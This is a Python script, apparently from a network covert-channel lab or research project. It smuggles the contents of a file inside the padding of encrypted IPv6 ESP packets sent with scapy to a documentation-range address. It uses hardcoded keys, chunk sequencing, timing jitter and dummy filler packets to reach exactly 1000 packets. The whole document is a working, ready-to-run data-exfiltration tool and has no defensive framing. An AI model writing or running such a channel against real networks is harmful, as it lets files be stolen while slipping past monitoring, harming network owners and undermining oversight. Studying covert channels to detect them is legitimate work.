#!/usr/bin/env python3
import sys, random, time, hashlib, struct
from scapy.all import sendp, Ether, IPv6, UDP, Raw
from Cryptodome.Cipher import AES
from Cryptodome.Hash import HMAC, SHA1
from Cryptodome.Random import get_random_bytes

# ========== CONSTANTS ==========
IFACE = "enp1s0"
OUT_SRC = "2001:db8:100::10"
OUT_DST = "2001:db8:100::20"

INNER_SRC = "2001:db8:2::1"
INNER_DST = "2001:db8:2::2"
SRC_PORT, DST_PORT = 4444, 5555

SPI = 0x100
BLOCK = 16
MAX_PACKETS = 1000
MAX_COVERT = 14
DATA_PER_CHUNK = MAX_COVERT - 3

ENC_KEY = bytes.fromhex("0102030405060708090a0b0c0d0e0f10")
AUTH_KEY = bytes.fromhex("1112131415161718191a1b1c1d1e1f2021222324")

SENT = 0


# ========== RANDOM INNER PAYLOAD ==========
def make_inner():
    size = random.randint(30, 90)
    payload = get_random_bytes(size)
    pkt = IPv6(src=INNER_SRC, dst=INNER_DST) / UDP(sport=SRC_PORT, dport=DST_PORT) / Raw(payload)
    return bytes(pkt)


# ========== BUILD PLAINTEXT WITH RANDOM PADDING ==========
def make_plain(inner, covert):
    base = len(inner) + 2
    pad = (BLOCK - (base % BLOCK)) % BLOCK
    pad += random.randint(0, 6)

    if pad < len(covert) + 1:
        pad = len(covert) + 1

    if pad > 255:
        pad = 255

    padbytes = (
        bytes([len(covert)]) +
        covert +
        get_random_bytes(pad - 1 - len(covert))
    )

    return inner + padbytes + bytes([pad]) + b"\x11"


# ========== ESP ENCRYPT ==========
def esp_encrypt(seq, plaintext):
    iv = get_random_bytes(BLOCK)

    pad = BLOCK - (len(plaintext) % BLOCK)
    padded = plaintext + bytes([pad]) * pad

    cipher = AES.new(ENC_KEY, AES.MODE_CBC, iv)
    ct = cipher.encrypt(padded)

    hdr = struct.pack("!II", SPI, seq)

    h = HMAC.new(AUTH_KEY, digestmod=SHA1)
    h.update(hdr + iv + ct)
    icv = h.digest()

    return hdr + iv + ct + icv


# ========== SEND ONE PACKET ==========
def send_packet(seq, covert=b""):
    global SENT
    if SENT >= MAX_PACKETS:
        return False

    inner = make_inner()
    pt = make_plain(inner, covert)
    esp = esp_encrypt(seq, pt)

    pkt = (
        Ether(dst="ff:ff:ff:ff:ff:ff") /
        IPv6(src=OUT_SRC, dst=OUT_DST, nh=50) /
        Raw(esp)
    )

    sendp(pkt, iface=IFACE, verbose=False)

    SENT += 1
    print(f"[+] Sent seq={seq}, covert={len(covert)}, total={SENT}")

    time.sleep(random.uniform(0.0008, 0.003))
    return True


# ========== SEND FILE ==========
def send_file(path):
    global SENT

    data = open(path, "rb").read()
    size = len(data)

    print(f"[+] File: {path} ({size} bytes)")
    print("[+] SHA256:", hashlib.sha256(data).hexdigest())

    if size == 0:
        print("[!] Empty file \u2192 sending 1000 dummy packets.")
        seq = 1
        while SENT < MAX_PACKETS:
            send_packet(seq, b"")
            seq += 1
        return

    chunks = (size + DATA_PER_CHUNK - 1) // DATA_PER_CHUNK
    repeats = MAX_PACKETS // chunks or 1

    seq = 1
    offset = 0
    cid = 0

    while offset < size:
        part = data[offset:offset + DATA_PER_CHUNK]
        offset += len(part)

        last = 1 if offset >= size else 0
        covert = bytes([(cid >> 8) & 0xFF, cid & 0xFF, last]) + part

        for _ in range(repeats):
            send_packet(seq, covert)
            seq += 1

        cid += 1

    while SENT < MAX_PACKETS:
        send_packet(seq, b"")
        seq += 1

    print("[+] Done: Sent exactly 1000 packets.")


# ========== MAIN ==========
if __name__ == "__main__":
    print("\n=== SENDER 1000-PACKET MODE ===\n")

    if len(sys.argv) > 1 and sys.argv[1] == "--file":
        send_file(sys.argv[2])
    else:
        print("Usage: sender1.py --file <path>")
